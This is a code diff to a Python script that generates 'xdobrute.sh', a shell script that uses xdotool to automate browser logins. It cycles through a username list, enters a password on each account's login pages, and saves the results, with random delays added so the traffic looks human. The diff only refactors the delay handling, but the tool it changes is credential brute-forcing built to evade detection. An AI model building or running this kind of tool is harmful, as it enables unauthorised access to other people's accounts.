@@ -8,7 +8,6 @@
 
 ########################################################################
 
-_DEV_ = True
 
 from random import randrange # to generate noise
 from pathlib import Path # to handle files
@@ -22,6 +21,7 @@ user_list = sys.argv[3] # expects path to a file
 
 target_filename = "xdobrute.sh"
 delay = 3 # seconds
+load_time = 3 # seconds to wait for the page to load
 
 # Browser search bar "x y"coordinates
 search = "1011 95"
@@ -48,10 +48,6 @@ all_data = "988 191"
 def add_noise():
     return randrange(0, 15)/10
 
-# Sets the request delay.
-def wait_load():
-    return 3
-
 
 # Load the usernames from file into a list.
 print(f"Loading username file '{user_list}'...")
@@ -73,9 +69,9 @@ for user in usernames:
     commands.append("xdotool key 'Delete'")
     commands.append(f"xdotool mousemove {search} click 1 type '{target_url}'")
     commands.append(f"xdotool mousemove {search} key 'Return'")
-    commands.append(f"sleep {wait_load() + add_noise()}")
+    commands.append(f"sleep {load_time + add_noise()}")
     commands.append(f"xdotool mousemove {sign_in} click 1")
-    commands.append(f"sleep {wait_load() + add_noise()}")
+    commands.append(f"sleep {load_time + add_noise()}")
     
     
     # Navigate the username entry page
@@ -84,7 +80,7 @@ for user in usernames:
     commands.append(f"xdotool mousemove {user_field} click 1 type '{user}'") # inputs username
     commands.append(f"xdotool mousemove {user_field} click 1 key 'Return'") # submits username
 
-    commands.append(f"sleep {wait_load() + add_noise()}")
+    commands.append(f"sleep {load_time + add_noise()}")
 
     # Navigate the password entry page
     commands.append(f"xdotool mousemove {password_field} click 1 key ctrl+a")
@@ -92,7 +88,7 @@ for user in usernames:
     commands.append(f"xdotool mousemove {password_field} click 1 type '{password}'")
     commands.append(f"xdotool mousemove {password_field} click 1 key 'Return'")
     
-    commands.append(f"sleep {wait_load() + add_noise()}")
+    commands.append(f"sleep {load_time + add_noise()}")
     
     # Save page results
     commands.append(f"xdotool mousemove {blank} click 1 key ctrl+a")
@@ -103,7 +99,7 @@ for user in usernames:
     # Add a delay
     commands.append(f"sleep {delay}")
     
-    commands.append(f"sleep {wait_load()}")
+    commands.append(f"sleep {load_time}")
     commands.append(f"xdotool mousemove {all_data} click 1")
     
     # Process page result.
